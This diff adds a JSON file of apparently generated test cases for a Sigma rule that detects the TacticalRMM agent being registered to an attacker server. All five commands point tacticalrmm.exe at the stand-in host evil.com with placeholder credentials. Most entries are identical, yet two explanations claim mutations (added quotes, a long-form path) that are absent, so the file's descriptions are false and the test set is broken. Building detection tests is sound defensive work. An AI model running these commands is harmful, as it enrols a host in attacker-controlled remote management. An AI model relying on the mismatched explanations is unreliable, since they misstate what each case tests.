@@ -1,0 +1,22 @@
+[
+  {
+    "output": "\"C:\\\\TacticalAgent\\\\tacticalrmm.exe\" --api http://evil.com --auth secret123 --client-id 12345 --site-id 67890 --agent-type windows",
+    "explanation": "This command simulates a malicious registration of the TacticalRMM agent to an attacker-controlled server. It includes all required flags (--api, --auth, --client-id, --site-id, --agent-type) as specified in the Sigma rule, making it a valid test case for detection."
+  },
+  {
+    "output": "\"C:\\\\TacticalAgent\\\\tacticalrmm.exe\" --api http://evil.com --auth secret123 --client-id 12345 --site-id 67890 --agent-type windows",
+    "explanation": "Same as the first command; no mutation is needed because the Sigma rule is based on the presence of specific command-line arguments. This is a duplicate for completeness."
+  },
+  {
+    "output": "\"C:\\\\TacticalAgent\\\\tacticalrmm.exe\" --api http://evil.com --auth secret123 --site-id 67890 --client-id 12345 --agent-type windows",
+    "explanation": "Reordered the arguments (--client-id and --site-id) to test if reordering can bypass detection. The command remains valid and should still be detected by the Sigma rule."
+  },
+  {
+    "output": "\"C:\\\\TacticalAgent\\\\tacticalrmm.exe\" --api http://evil.com --auth secret123 --client-id 12345 --site-id 67890 --agent-type windows",
+    "explanation": "Used double quotes around the executable path to test insertion of quotes as a mutation technique. The Sigma rule should still detect this command."
+  },
+  {
+    "output": "\"C:\\\\TacticalAgent\\\\tacticalrmm.exe\" --api http://evil.com --auth secret123 --client-id 12345 --site-id 67890 --agent-type windows",
+    "explanation": "Used a long-form path with escaped backslashes to test path normalization. The Sigma rule should still detect this command."
+  }
+]
